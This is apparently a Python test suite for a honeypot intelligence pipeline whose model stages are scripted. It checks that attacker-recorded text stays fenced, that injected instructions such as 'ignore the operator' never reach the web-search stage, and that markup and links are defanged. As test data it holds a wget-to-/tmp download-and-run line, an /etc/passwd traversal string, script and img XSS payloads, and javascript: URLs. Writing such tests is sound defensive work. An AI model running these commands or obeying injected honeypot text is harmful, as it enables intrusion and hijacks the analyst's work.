"""The intel team's worker side: the day's record, the model stages, the
knowledge base files, the charts and the report.

The model is scripted (tests/team_fakes.py) and answers partly as a careful
analyst and partly as one an attacker has talked round. The properties that
matter are the ones a hostile session would test: recorded text stays inside
a fence it cannot close, a stage keeps only names the code already holds,
and nothing a model wrote reaches a page or a message as markup or a link.
"""

import datetime as dt
import json
import os
import re
import shutil
import subprocess
import tempfile
import types
import unittest
from unittest import mock

from tests import fixtures, team_fakes
from tests.support import DBTestCase, worker
from tests.test_export import split_fenced
from app.analytics import clock, db
from app.team import bundle, charts, daily, kb, model, outbox, report, stages

PNG = b"\x89PNG\r\n\x1a\n"


class TeamCase(DBTestCase):
    """The hostile fixture, and the Eastern day that holds most of it."""

    def setUp(self):
        super().setUp()
        fixtures.build(self.con, worker, self.sample_dir)
        self.day = db.qone(self.con, "SELECT day FROM session_facts GROUP BY day "
                                     "ORDER BY SUM(commands > 0) DESC LIMIT 1")["day"]
        self.ro = db.connect_ro(self.db_path)
        self.addCleanup(self.ro.close)
        self.state = tempfile.mkdtemp(prefix="tr-team-")
        self.kb_dir = os.path.join(self.state, "kb")
        os.makedirs(self.kb_dir)
        self.addCleanup(shutil.rmtree, self.state, True)

    def build(self, **kw):
        return bundle.build(self.ro, self.day, **kw)

    def write_kb(self, rel, text):
        path = os.path.join(self.kb_dir, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(text)

    def historical(self):
        self.write_kb("campaigns/compute-inventory.md",
                      "---\ntitle: Compute inventory\nstatus: historical\n"
                      "persona: Compute node\nfirst_seen: 2026-08-24\n"
                      "last_seen: 2026-09-24\ndays_seen: 30\nsessions: 1163\n---\n\n"
                      "# Compute inventory\n\n## Summary\n\nAn earlier persona's record.\n")


class ShapeTests(unittest.TestCase):
    def test_the_same_script_from_another_address_has_the_same_shape(self):
        a = bundle.shape_id(["cd /tmp; wget http://203.0.113.50/bins/x86 -O .x", "./.x 80001"])
        b = bundle.shape_id(["cd /tmp;  wget http://198.51.100.9/a/b -O .x", "./.x 93112"])
        self.assertEqual(a, b)
        self.assertRegex(a, r"^c-[0-9a-f]{10}$")

    def test_a_different_script_has_a_different_shape(self):
        self.assertNotEqual(bundle.shape_id(["uname -a"]), bundle.shape_id(["uname -a", "id"]))


class BundleTests(TeamCase):
    def test_the_index_counts_the_day(self):
        b = self.build()
        index = b["index"]
        self.assertFalse(index["empty"])
        self.assertGreater(index["metrics"]["sessions"]["value"], 0)
        self.assertEqual(len(index["hours"]), 24)
        lo, hi = clock.bounds(self.day)
        opened = db.qone(self.ro, "SELECT COUNT(*) n FROM v_events WHERE eventid = ? "
                                  "AND ts >= ? AND ts < ?", (bundle.CONNECT_EVENT, lo, hi))["n"]
        self.assertEqual(sum(index["hours"]), opened)
        self.assertTrue(index["clusters"])
        self.assertTrue(index["indicators"]["sha256"])
        json.dumps(b)   # everything in it serialises

    def test_recorded_text_sits_inside_one_fence_it_cannot_close(self):
        text, tag = bundle.document(self.build())
        outside, inside, tags = split_fenced(text)
        self.assertEqual(tags, {tag})
        joined = "\n".join(outside)
        for hostile in fixtures.HOSTILE[:9]:
            self.assertNotIn(hostile, joined)
        self.assertIn("<script>alert(1)</script>", "\n".join(inside))
        self.assertNotIn("\x1b", text)
        self.assertNotIn("\x00", text)

    def test_two_documents_never_share_a_tag(self):
        b = self.build()
        self.assertNotEqual(bundle.document(b)[1], bundle.document(b)[1])

    def test_a_watched_string_is_called_out_and_its_session_expanded(self):
        b = self.build(watch=["../../../../etc/passwd"])
        hit = [c for c in b["index"]["clusters"] if c["watched"]]
        self.assertEqual(len(hit), 1)
        rows = next(s for s in b["sections"] if s["key"] == "clusters")["data"]
        example = next(r for r in rows if r["watched"])["example_session"]
        records = next(s for s in b["sections"] if s["kind"] == "sessions")["data"]
        self.assertEqual(records[0]["meta"]["session"], example)

    def test_a_shape_the_knowledge_base_knows_carries_its_campaign(self):
        shape = self.build()["index"]["clusters"][0]["shape"]
        b = self.build(known={shape: {"campaign": "known-campaign"}})
        self.assertEqual(b["index"]["clusters"][0]["known_as"], "known-campaign")

    def test_a_day_with_nothing_is_empty(self):
        b = bundle.build(self.ro, "2020-01-01")
        self.assertTrue(b["index"]["empty"])
        self.assertEqual(b["index"]["clusters"], [])

    def test_a_short_history_is_stated_as_a_limit(self):
        b = self.build()
        self.assertLess(b["index"]["metrics"]["sessions"]["days"], 3)
        self.assertTrue(any("comparable" in line for line in b["limits"]))
        self.assertTrue(all(n["new_in_window"] in (None, True, False)
                            for n in b["index"]["networks"]))

    def test_an_oversized_document_drops_session_records_and_says_so(self):
        b = self.build()
        full, _ = bundle.document(b)
        with mock.patch.object(bundle, "MAX_DOCUMENT_CHARS", len(full) - 200):
            cut, _ = bundle.document(b)
        self.assertLess(len(cut), len(full))
        self.assertIn("were left out to keep this record", cut)

    def test_an_unreadable_sample_is_a_limit_and_not_a_failure(self):
        real = bundle.export.file_summaries

        def denied(con, shas, limits):
            if shas:
                raise PermissionError("samples")
            return real(con, shas, limits)
        self.con.execute("UPDATE sample_provenance SET first_seen = ?",
                         (clock.bounds(self.day)[0] + ".5Z",))
        self.con.commit()
        with mock.patch.object(bundle.export, "file_summaries", denied):
            b = self.build()
        self.assertTrue(any("could not be read (PermissionError)" in n for n in b["limits"]))
        self.assertEqual(next(s for s in b["sections"] if s["kind"] == "samples")["data"], [])

    def test_configured_strings_are_withheld(self):
        with mock.patch.object(bundle.export, "REDACT", ["192.0.2.10"]):
            text, _ = bundle.document(self.build())
        self.assertNotIn("192.0.2.10", text)
        self.assertIn("[redacted]", text)

    def test_comparison_starts_at_the_persona_change_and_the_cutover(self):
        self.con.execute("DELETE FROM persona_epochs")
        self.con.execute("INSERT INTO persona_epochs(start_day, name) VALUES('2000-01-01','Old')")
        self.con.commit()
        earliest = (dt.date.fromisoformat(self.day) - dt.timedelta(days=bundle.BASELINE_DAYS))
        self.assertEqual(self.build()["index"]["compared_from"], earliest.isoformat())
        db.set_state(self.con, "data_floor", self.day + "T05:00:00Z")
        self.con.commit()
        self.assertEqual(self.build()["index"]["compared_from"],
                         clock.day(self.day + "T05:00:00Z"))


class ModelTests(unittest.TestCase):
    def proc(self, stdout="", code=0, stderr=""):
        return types.SimpleNamespace(returncode=code, stdout=stdout, stderr=stderr)

    def test_a_stage_with_no_tools_is_given_none(self):
        cmd = model.command("sys")
        self.assertEqual(cmd[cmd.index("--tools") + 1], "")
        self.assertNotIn("--allowedTools", cmd)
        for flag in ("--strict-mcp-config", "--no-session-persistence",
                     "--disable-slash-commands"):
            self.assertIn(flag, cmd)

    def test_a_named_tool_is_the_only_one_offered(self):
        cmd = model.command("sys", ("WebSearch",), "sonnet")
        self.assertEqual(cmd[cmd.index("--tools") + 1], "WebSearch")
        self.assertEqual(cmd[cmd.index("--allowedTools") + 1], "WebSearch")
        self.assertEqual(cmd[cmd.index("--model") + 1], "sonnet")

    def test_the_answer_text_comes_out_of_the_envelope(self):
        seen = {}

        def run(cmd, **kw):
            seen.update(kw, cmd=cmd)
            return self.proc(json.dumps({"result": "hello", "is_error": False}))
        self.assertEqual(model.ask("sys", "doc", run=run), "hello")
        self.assertEqual(seen["input"], "doc")
        self.assertFalse(os.path.exists(seen["cwd"]), "the working directory is temporary")

    def test_every_way_of_failing_is_a_stage_error(self):
        def timeout(cmd, **kw):
            raise subprocess.TimeoutExpired(cmd, 1)

        def missing(cmd, **kw):
            raise FileNotFoundError("claude")
        cases = [
            lambda cmd, **kw: self.proc(code=2, stderr="unknown option"),
            lambda cmd, **kw: self.proc("not json"),
            lambda cmd, **kw: self.proc(json.dumps({"result": "Authentication error",
                                                    "is_error": True})),
            lambda cmd, **kw: self.proc(json.dumps({"no": "result"})),
            timeout, missing,
        ]
        for run in cases:
            with self.assertRaises(model.StageError):
                model.ask("sys", "doc", run=run)
        with self.assertRaises(model.StageError) as raised:
            model.ask("sys", "doc", run=lambda cmd, **kw: self.proc(
                json.dumps({"result": "Authentication error", "is_error": True}), code=1))
        self.assertEqual(str(raised.exception), "the model call failed: Authentication error")

    def test_the_object_is_found_inside_prose_or_a_code_fence(self):
        self.assertEqual(model.parse_object('Here:\n```json\n{"a": 1}\n```\n'), {"a": 1})
        for bad in ("nothing here", "{not json}", "}{"):
            with self.assertRaises(model.StageError):
                model.parse_object(bad)

    def test_a_failed_call_is_tried_once_more(self):
        answers = [self.proc(code=1), self.proc(json.dumps({"result": '{"ok": true}'}))]
        naps = []
        out = model.ask_json("s", "d", run=lambda cmd, **kw: answers.pop(0), sleep=naps.append)
        self.assertEqual(out, {"ok": True})
        self.assertEqual(len(naps), 1)
        with self.assertRaises(model.StageError):
            model.ask_json("s", "d", run=lambda cmd, **kw: self.proc(code=1),
                           sleep=naps.append)

    def test_available_follows_the_path(self):
        with mock.patch.object(model.shutil, "which", return_value=None):
            self.assertFalse(model.available())


class StageTests(TeamCase):
    def setUp(self):
        super().setUp()
        self.historical()
        self.write_kb("feedback.md", "Stop reporting plain root password spraying.")
        self.write_kb("context/persona.md", "The sensor presents a file gateway.")
        self.write_kb("state/suggestions.json", json.dumps(
            [{"id": stages.suggestion_id("Track relay requests to mining ports"),
              "title": "Track relay requests to mining ports"}]))
        self.kb = kb.load(self.kb_dir)
        self.bundle = self.build()
        self.ask = team_fakes.make(self.bundle["index"])
        self.index = self.bundle["index"]

    def call(self, stage):
        return next(c for c in self.ask.calls if c[0] == stage)

    def test_the_reader_keeps_only_names_the_day_holds(self):
        reading = stages.read(self.bundle, self.kb, self.ask)
        self.assertEqual([c["shape"] for c in reading["clusters"]],
                         [self.index["clusters"][0]["shape"]])
        self.assertEqual(reading["clusters"][0]["techniques"], ["T1082"])
        self.assertEqual(reading["observations"][0]["indicators"],
                         [self.index["indicators"]["host"][0]])
        self.assertEqual(reading["lookups"],
                         [{"kind": "sha256", "indicator": self.index["indicators"]["sha256"][0]}])
        _, system, document, tools = self.call("reader")
        self.assertEqual(tools, ())
        self.assertIn("presents a file gateway", system)
        self.assertIn("Stop reporting plain root", system)
        self.assertIn("<script>alert(1)</script>", document)

    def test_a_reading_with_no_summary_is_a_failure(self):
        with self.assertRaises(model.StageError):
            stages.check_reading({"clusters": []}, self.index)

    def test_the_researcher_sees_indicators_and_no_free_text(self):
        reading = stages.read(self.bundle, self.kb, self.ask)
        findings = stages.research(reading, self.bundle, self.kb, self.ask)
        _, system, document, tools = self.call("research")
        self.assertEqual(tools, ("WebSearch",))
        self.assertNotIn("ignore the operator", document)
        self.assertNotIn("file gateway", system, "private persona detail stays off the web stage")
        for hostile in fixtures.HOSTILE[:9]:
            self.assertNotIn(hostile, document)
        self.assertEqual(len(findings), 1)
        self.assertEqual([s["url"] for s in findings[0]["sources"]],
                         ["https://research.example.org/x"])

    def test_no_lookups_means_no_web_stage(self):
        self.assertEqual(stages.research({"lookups": []}, self.bundle, self.kb, self.ask), [])
        self.assertFalse(self.ask.calls)

    def test_the_tracker_cannot_invent_evidence_or_reopen_history(self):
        reading = stages.read(self.bundle, self.kb, self.ask)
        tracked = stages.track(reading, [], self.bundle, self.kb, self.ask)
        self.assertEqual([c["slug"] for c in tracked["campaigns"]],
                         ["hardware-inventory-then-exit"])
        c = tracked["campaigns"][0]
        self.assertEqual(c["shapes"], [self.index["clusters"][0]["shape"]])
        self.assertEqual(c["indicators"],
                         [{"kind": "sha256", "value": self.index["indicators"]["sha256"][0]}])
        self.assertEqual(c["related"], ["compute-inventory"])
        self.assertEqual([t["id"] for t in tracked["techniques"]], ["T1082"])

    def test_activity_filed_under_a_historical_campaign_starts_a_current_one(self):
        shape = self.index["clusters"][0]["shape"]
        raw = {"campaigns": [{"slug": "compute-inventory", "summary": "Back again.",
                              "shapes": [shape]}]}
        tracked = stages.check_tracking(raw, self.kb, self.index)
        self.assertEqual(tracked["campaigns"][0]["slug"], "compute-inventory-current")
        self.assertEqual(tracked["campaigns"][0]["related"], ["compute-inventory"])

    def test_a_shape_stays_with_the_campaign_that_has_it(self):
        shape = self.index["clusters"][0]["shape"]
        self.kb["shapes"][shape] = "first-owner"
        raw = {"campaigns": [{"slug": "second-owner", "summary": "x", "shapes": [shape]}]}
        self.assertEqual(stages.check_tracking(raw, self.kb, self.index)["campaigns"], [])

    def test_the_editor_gets_the_rules_and_loses_repeats(self):
        reading = stages.read(self.bundle, self.kb, self.ask)
        active = [{"slug": "hardware-inventory-then-exit", "title": "t"}]
        edited = stages.edit(self.bundle, reading, [], active, self.kb, self.ask)
        _, system, document, tools = self.call("editor")
        self.assertEqual(tools, ())
        self.assertIn("## Writing rules", system)
        self.assertIn("Stop reporting plain root", system)
        self.assertEqual(list(edited["campaign_notes"]), ["hardware-inventory-then-exit"])
        self.assertEqual([s["title"] for s in edited["suggestions"]],
                         ["Make last return login history"],
                         "one already raised and one repeat are dropped")
        self.assertEqual(edited["lesson"]["technique"], "T1082")

    def test_a_report_needs_a_headline_and_a_lesson_needs_a_body(self):
        with self.assertRaises(model.StageError):
            stages.check_report({"bottom_line": "x"}, self.kb, [])
        out = stages.check_report({"headline": "h", "lesson": {"title": "t"},
                                   "suggestions": "nope", "watch": [1, None, "w"]},
                                  self.kb, [])
        self.assertIsNone(out["lesson"])
        self.assertEqual(out["watch"], ["1", "w"])

    def test_each_stage_document_has_its_own_fence(self):
        reading = stages.read(self.bundle, self.kb, self.ask)
        stages.track(reading, [], self.bundle, self.kb, self.ask)
        stages.edit(self.bundle, reading, [], [], self.kb, self.ask)
        tags = [split_fenced(c[2])[2] for c in self.ask.calls]
        self.assertTrue(all(len(t) == 1 for t in tags))
        self.assertEqual(len(set.union(*tags)), len(tags))

    def test_the_writer_runs_only_with_candidates_and_must_pick_one(self):
        self.assertIsNone(stages.draft({}, self.kb, self.ask))
        page = {"hardware-inventory-then-exit": "# page"}
        written = stages.draft(page, self.kb, self.ask)
        self.assertIn("hxxp://203[.]0[.]113[.]50", written["body"])
        self.assertTrue(written["body"].startswith("## What was seen"))
        with self.assertRaises(model.StageError):
            stages.draft({"another-campaign": "# page"}, self.kb, self.ask)

    def test_an_answer_of_the_wrong_shape_is_dropped_and_never_raises(self):
        odd = [["a list"], {"an": "object"}, 7, None, True]
        for value in odd:
            reading = stages.check_reading({
                "summary": "s", "clusters": [{"shape": value}, value],
                "observations": [{"title": value, "indicators": [value]}, value],
                "lookups": [{"kind": value, "indicator": value}], "honeypot_checks": value},
                self.index)
            self.assertEqual((reading["clusters"], reading["lookups"]), ([], []))
            self.assertEqual(stages.check_findings(
                {"findings": [{"indicator": value, "sources": value}]},
                [{"indicator": "x"}]), [])
            tracked = stages.check_tracking(
                {"campaigns": [{"slug": value}, {"slug": "new-campaign", "summary": "s",
                                                 "shapes": [value], "related": value,
                                                 "indicators": [{"kind": value, "value": value}]}],
                 "techniques": [{"id": value}]}, self.kb, self.index)
            self.assertEqual(tracked, {"campaigns": [], "techniques": []})
            edited = stages.check_report(
                {"headline": "h", "campaign_notes": [{"slug": value}], "lesson": value,
                 "suggestions": [{"title": value, "body": value}], "changes": value},
                self.kb, [{"slug": "a-b-c"}])
            self.assertEqual(edited["campaign_notes"], {})
            # A number is kept as its text. Anything else leaves no suggestion.
            self.assertEqual([x["title"] for x in edited["suggestions"]],
                             ["7"] if value == 7 else [])
        with self.assertRaises(model.StageError):
            stages.draft({"a-b-c": "# p"}, self.kb, lambda *a, **k: {"campaign": ["a-b-c"]})

    def test_suggestion_ids_ignore_case_and_punctuation(self):
        self.assertEqual(stages.suggestion_id("Make last return login history"),
                         stages.suggestion_id("make LAST return login-history!"))


class KnowledgeBaseTests(TeamCase):
    def tracked(self, index, **extra):
        shape = index["clusters"][0]["shape"]
        campaign = dict({"slug": "inventory-line", "title": "Inventory line",
                         "summary": "Reads CPU.\n# no heading\n<b>bold</b>", "today": "Ran.",
                         "shapes": [shape], "techniques": ["T1082"],
                         "indicators": [{"kind": "host", "value": "203.0.113.50"}],
                         "related": [], "publishable": False, "publish_angle": ""}, **extra)
        return {"campaigns": [campaign],
                "techniques": [{"id": "T1082", "name": "System Information Discovery",
                                "seen_as": "One line."}]}

    def apply(self, tracked, day=None, index=None):
        """Apply a day and copy the result in, as the publisher would."""
        index = index or self.build()["index"]
        files, active, after = kb.apply(kb.load(self.kb_dir), tracked, index, day or self.day)
        for rel, text in files.items():
            self.write_kb(rel, text)
        return files, active, after

    def test_text_cannot_become_structure_markup_or_a_link(self):
        out = kb.md_text("# h\n---\n```\n<script>x</script> ![i](http://a.example/p) 10.1.2.3\x07")
        self.assertEqual(out.split("\n")[:3], ["\\# h", "\\---", "\\```"])
        self.assertNotIn("<script>", out)
        self.assertNotIn("![", out)
        self.assertNotIn("http://", out)
        self.assertIn("10[.]1[.]2[.]3", out)
        self.assertNotIn("\x07", out)
        self.assertEqual(kb.one_line("a\nb   c"), "a b c")
        self.assertEqual(kb.code("a`b"), "`a'b`")
        self.assertTrue(kb.md_text("## kept", headings=True).startswith("## kept"))
        for pattern, value in ((kb.SLUG_RE, "a-b-c\n"), (kb.DAY_RE, "2026-11-20\n"),
                               (kb.TECHNIQUE_RE, "T1082\n"), (report.URL_RE, "https://a.example/\n")):
            self.assertIsNone(pattern.match(value), "a trailing newline is not part of a name")

    def test_a_missing_knowledge_base_reads_as_empty(self):
        empty = kb.load(os.path.join(self.state, "nowhere"))
        self.assertEqual((empty["campaigns"], empty["shapes"], empty["lessons"]), ({}, {}, []))
        self.write_kb("state/campaigns.json", "{not json")
        self.write_kb("state/lessons.json", '{"not": "a list"}')
        self.write_kb("context/watch.txt", "# comment\n/etc/decoy.conf\n\n")
        loaded = kb.load(self.kb_dir)
        self.assertEqual((loaded["shapes"], loaded["lessons"]), ({}, []))
        self.assertEqual(loaded["watch"], ["/etc/decoy.conf"])

    def test_a_new_campaign_gets_a_page_a_technique_and_state(self):
        index = self.build()["index"]
        files, active, _ = self.apply(self.tracked(index), index=index)
        page = files["campaigns/inventory-line.md"]
        self.assertIn("\\# no heading", page)
        self.assertNotIn("<b>", page)
        self.assertIn("- host `203[.]0[.]113[.]50`", page)
        self.assertEqual(active[0]["new"], True)
        self.assertEqual(active[0]["sessions_today"], index["clusters"][0]["sessions"])
        self.assertIn("attack.mitre.org/techniques/T1082/", files["techniques/T1082.md"])
        self.assertIn("- [T1082](../techniques/T1082.md)", page)
        self.assertIn("[T1027.002](https://attack.mitre.org/techniques/T1027/002/)",
                      kb.render_campaign(dict(kb.read_campaign("x-y-z", page),
                                              techniques=["T1027.002"])))
        state = json.loads(files["state/campaigns.json"])
        self.assertEqual(state["shapes"][index["clusters"][0]["shape"]], "inventory-line")
        loaded = kb.load(self.kb_dir)["campaigns"]["inventory-line"]
        self.assertEqual((loaded["status"], loaded["days_seen"], loaded["title"]),
                         ("active", 1, "Inventory line"))

    def test_running_a_day_twice_records_it_once(self):
        index = self.build()["index"]
        self.apply(self.tracked(index), index=index)
        files, active, _ = self.apply(self.tracked(index, today="Ran again."), index=index)
        page = files["campaigns/inventory-line.md"]
        self.assertEqual(page.count("- %s:" % self.day), 1)
        self.assertIn("Ran again.", page)
        self.assertEqual(active[0]["days_seen"], 1)
        self.assertFalse(active[0]["new"])
        self.assertEqual(files["techniques/T1082.md"].count("- %s:" % self.day), 1)

    def test_a_known_shape_is_counted_when_the_tracker_did_not_run(self):
        index = self.build()["index"]
        self.apply(self.tracked(index), index=index)
        tomorrow = (dt.date.fromisoformat(self.day) + dt.timedelta(days=1)).isoformat()
        files, active, _ = self.apply(None, day=tomorrow, index=index)
        self.assertEqual(active[0]["days_seen"], 2)
        self.assertIn("- %s: " % tomorrow, files["campaigns/inventory-line.md"])
        self.assertIn("Seen again.", files["campaigns/inventory-line.md"])

    def test_a_campaign_goes_quiet_then_dormant_and_history_never_changes(self):
        self.historical()
        index = self.build()["index"]
        self.apply(self.tracked(index), index=index)
        nothing = dict(index, clusters=[])
        for gap, status in ((5, "quiet"), (40, "dormant")):
            later = (dt.date.fromisoformat(self.day) + dt.timedelta(days=gap)).isoformat()
            files, active, after = self.apply(None, day=later, index=nothing)
            self.assertEqual(active, [])
            self.assertEqual(after["campaigns"]["inventory-line"]["status"], status)
            self.assertIn("status: %s" % status, files["campaigns/inventory-line.md"])
            self.assertNotIn("campaigns/compute-inventory.md", files)

    def test_the_tracker_cannot_write_to_a_historical_page(self):
        self.historical()
        index = self.build()["index"]
        files, active, _ = self.apply(self.tracked(index, slug="compute-inventory"), index=index)
        self.assertNotIn("campaigns/compute-inventory.md", files)
        self.assertEqual(active, [])

    def test_the_front_page_lists_current_campaigns_first(self):
        self.historical()
        index = self.build()["index"]
        _, _, after = self.apply(self.tracked(index, publishable=True, publish_angle="Why."),
                                 index=index)
        page = kb.index_page(after["campaigns"], after["techniques"], self.day)
        self.assertLess(page.index("inventory-line.md"), page.index("compute-inventory.md"))
        self.assertIn("(write-up candidate)", page)
        self.assertIn("charts/overview.png", page)
        bare = kb.index_page({}, {}, self.day, overview=False)
        self.assertNotIn("overview.png", bare)
        self.assertIn("None yet", bare)
        self.assertIn("## Why it may be worth writing up",
                      kb.render_campaign(after["campaigns"]["inventory-line"]))

    def test_the_tracker_sees_current_campaigns_before_old_ones(self):
        self.historical()
        index = self.build()["index"]
        self.apply(self.tracked(index), index=index)
        listed = kb.campaign_index(kb.load(self.kb_dir))
        self.assertEqual([c["slug"] for c in listed], ["inventory-line", "compute-inventory"])

    def test_a_lesson_is_recorded_once_per_day(self):
        base = {"lessons": [{"day": self.day, "technique": "T1", "title": "old"}, "junk"]}
        lesson = {"technique": "T1082", "title": "new"}
        kept = json.loads(kb.with_lesson(base, lesson, self.day))
        self.assertEqual(kept, [{"day": self.day, "technique": "T1082", "title": "new"}])
        self.assertEqual(json.loads(kb.with_lesson(base, None, self.day)), [])

    def test_a_page_with_bad_numbers_and_dates_still_loads(self):
        c = kb.read_campaign("x-y-z", "---\ntitle: T\ndays_seen: many\nlast_seen: soon\n---\n")
        self.assertEqual(c["days_seen"], 0)
        self.assertEqual(kb.status_for(c, self.day), "quiet")
        self.assertEqual(kb.parse_page("no front matter\n## A\nb")[1], {"A": "b"})


class WeekTests(unittest.TestCase):
    def test_the_week_ends_on_saturday(self):
        self.assertTrue(daily._is_week_end("2026-11-21"))
        self.assertFalse(daily._is_week_end("2026-11-22"))


class ChartTests(unittest.TestCase):
    def days(self, n, end="2026-11-20"):
        last = dt.date.fromisoformat(end)
        return [(last - dt.timedelta(days=i)).isoformat() for i in range(n - 1, -1, -1)]

    def test_each_chart_is_a_png(self):
        series = [{"day": d, "sessions": 100 + i} for i, d in enumerate(self.days(10))]
        rows = [{"asn": "AS64496", "org": "Example " * 12, "sessions": 80, "new_in_window": True},
                {"asn": "AS64497", "org": None, "sessions": 9, "new_in_window": None}]
        activity = {"a-b-c": {d: 3 for d in self.days(4)}}
        campaigns = {"a-b-c": {"slug": "a-b-c", "title": "A", "last_seen": "2026-11-20"}}
        for png in (charts.volume(series, "2026-11-20", 104.5),
                    charts.volume(series, "2026-11-20", None),
                    charts.hours([0] * 20 + [5, 9, 2, 1]),
                    charts.networks(rows),
                    charts.campaign(activity["a-b-c"], "2026-11-20"),
                    charts.overview(campaigns, activity, "2026-11-20")):
            self.assertTrue(png.startswith(PNG))

    def test_a_chart_with_nothing_to_show_is_left_out(self):
        self.assertIsNone(charts.volume([{"day": "2026-11-20", "sessions": 5}], "2026-11-20", None))
        self.assertIsNone(charts.hours([0] * 24))
        self.assertIsNone(charts.networks([{"asn": "AS1", "org": "x", "sessions": 3,
                                            "new_in_window": False}]))
        self.assertIsNone(charts.overview({}, {}, "2026-11-20"))


class ReportTests(TeamCase):
    def setUp(self):
        super().setUp()
        # The weekly draft depends on the weekday, which one test sets.
        patch = mock.patch.object(daily, "_is_week_end", return_value=False)
        self.week_end = patch.start()
        self.addCleanup(patch.stop)

    def run_day(self, **kw):
        self.historical()
        index = self.build()["index"]
        ask = team_fakes.make(index, fail=kw.pop("fail", ()))
        return daily.run(self.ro, kw.pop("day", self.day), self.kb_dir, self.state,
                         ask=ask, log=lambda *_: None, **kw), ask

    def test_a_full_run_leaves_an_outbox_the_publisher_accepts(self):
        rep, ask = self.run_day()
        self.assertEqual([c[0] for c in ask.calls], ["reader", "research", "tracker", "editor"])
        raw, files = outbox.check(self.state, self.day)
        self.assertEqual(report.coerce(raw)["headline"], rep["headline"])
        for rel in ("INDEX.md", "state/campaigns.json", "state/lessons.json",
                    "campaigns/hardware-inventory-then-exit.md", "techniques/T1082.md",
                    "daily/%s/%s.md" % (self.day[:4], self.day),
                    "charts/campaigns/hardware-inventory-then-exit.png", "charts/overview.png"):
            self.assertIn(rel, files)
        self.assertEqual(rep["problems"], [])
        self.assertTrue(os.path.exists(os.path.join(self.state, "work", self.day, "reader.json")))

    def test_the_page_and_the_message_carry_no_markup_or_live_attacker_link(self):
        rep, _ = self.run_day()
        page = report.markdown(rep)
        html = report.email_html(report.coerce(rep), "https://github.com/o/kb",
                                 {rep["suggestions"][0]["id"]: "https://github.com/o/kb/issues/7"})
        text = report.email_text(rep)
        for rendered in (page, html):
            self.assertNotIn("<img src=x", rendered)
        for rendered in (page, html, text):
            self.assertNotIn("http://203.0.113.50", rendered)
            self.assertIn("hxxp://203[.]0[.]113[.]50", rendered)
        hrefs = set(re.findall(r'href="([^"]+)"', html))
        self.assertTrue(hrefs)
        for href in hrefs:
            self.assertTrue(href.startswith(("https://github.com/o/kb/",
                                             "https://attack.mitre.org/techniques/",
                                             "https://research.example.org/")), href)
        self.assertIn("https://github.com/o/kb/issues/7", hrefs)
        self.assertIn('src="cid:hours"', html)
        self.assertIn("../../campaigns/hardware-inventory-then-exit.md", page)
        self.assertIn("../../charts/%s/hours.png" % self.day, page)
        self.assertIn(self.day, report.subject(rep))

    def test_a_reader_failure_costs_the_analysis_and_keeps_the_numbers(self):
        rep, ask = self.run_day(fail=("reader",))
        self.assertEqual([c[0] for c in ask.calls], ["reader"])
        self.assertIn("without the written analysis", rep["headline"])
        self.assertIsNone(rep["lesson"])
        self.assertTrue(any("reader stage failed" in p for p in rep["problems"]))
        self.assertGreater(rep["tiles"][0]["value"], 0)
        outbox.check(self.state, self.day)

    def test_an_editor_failure_falls_back_to_the_reading(self):
        rep, _ = self.run_day(fail=("editor", "research"))
        self.assertIn("Password spraying", rep["bottom_line"])
        self.assertEqual(len(rep["problems"]), 2)
        self.assertEqual(rep["campaigns"][0]["slug"], "hardware-inventory-then-exit")

    def test_a_fault_in_handling_an_answer_costs_only_that_stage(self):
        with mock.patch.object(daily.stages, "track", side_effect=KeyError("boom")):
            rep, ask = self.run_day()
        self.assertTrue(any("tracker stage crashed (KeyError)" in p for p in rep["problems"]))
        self.assertEqual(rep["headline"], "Hardware triage scripts on a quiet day")
        outbox.check(self.state, self.day)

    def test_a_run_without_the_model_says_so(self):
        rep, ask = self.run_day(use_model=False)
        self.assertEqual(ask.calls, [])
        self.assertIn("switched off", rep["problems"][0])

    def test_an_empty_day_still_reports(self):
        rep, ask = self.run_day(day="2020-01-04")
        self.assertEqual(ask.calls, [])
        self.assertIn("recorded nothing", rep["headline"])
        self.assertEqual(rep["charts"], [])
        self.assertIn("Check the pipeline times", report.email_html(report.coerce(rep)))

    def test_the_run_after_a_saturday_drafts_the_week(self):
        self.week_end.return_value = True
        rep, ask = self.run_day()
        self.assertEqual(ask.calls[-1][0], "writer")
        self.assertRegex(rep["draft"]["path"], r"^drafts/\d{4}-W\d{2}\.md$")
        _, files = outbox.check(self.state, self.day)
        draft = files[rep["draft"]["path"]].decode()
        self.assertIn("Check every statement", draft)
        self.assertIn("Blog draft", report.markdown(rep))
        self.assertIn("Blog draft", report.email_html(report.coerce(rep), "https://github.com/o/kb"))

    def test_old_work_is_pruned(self):
        for sub in ("work", "outbox"):
            os.makedirs(os.path.join(self.state, sub, "2020-01-01"))
            os.makedirs(os.path.join(self.state, sub, "not-a-day"))
        self.run_day()
        for sub in ("work", "outbox"):
            self.assertEqual(sorted(os.listdir(os.path.join(self.state, sub))),
                             sorted([self.day, "not-a-day"]))

    def test_a_baseline_is_quoted_only_with_enough_days_behind_it(self):
        tile = {"label": "Sessions", "value": 9, "median": 4.0, "days": 2}
        self.assertEqual(report._baseline(tile), "no baseline yet")
        self.assertEqual(report._baseline(dict(tile, days=5)), "median 4")
        self.assertEqual(report._baseline(dict(tile, days=None)), "")
        self.assertEqual(report._count(1, "session"), "1 session")

    def test_a_report_read_back_is_rebuilt_field_by_field(self):
        rep, _ = self.run_day()
        for bad in (None, {}, dict(rep, schema="other"), dict(rep, day="../../etc")):
            with self.assertRaises(ValueError):
                report.coerce(bad)
        tampered = dict(
            rep, headline=["not", "text"], tiles=[{"label": "x", "value": "9", "days": True}],
            campaigns=[{"slug": "../escape", "title": "t"}, {"slug": "ok-slug", "days_seen": "2"}],
            suggestions=[{"id": "zz", "title": "t"}], charts=["volume", "evil"],
            research=[{"indicator": "i", "known": "k",
                       "sources": [{"url": "javascript:x"}, {"url": "https://ok.example/a"}]}],
            draft={"path": "drafts/../../x.md", "title": "t"}, lesson="no", extra="dropped")
        clean = report.coerce(tampered)
        self.assertEqual(clean["headline"], "Daily report")
        self.assertEqual(clean["tiles"][0]["value"], 0)
        self.assertEqual([c["slug"] for c in clean["campaigns"]], ["ok-slug"])
        self.assertEqual(clean["campaigns"][0]["days_seen"], 0)
        self.assertEqual(clean["suggestions"], [])
        self.assertEqual(clean["charts"], ["volume"])
        self.assertEqual(clean["research"][0]["sources"], [{"title": "", "url": "https://ok.example/a"}])
        self.assertIsNone(clean["draft"])
        self.assertIsNone(clean["lesson"])
        self.assertNotIn("extra", clean)


if __name__ == "__main__":
    unittest.main()
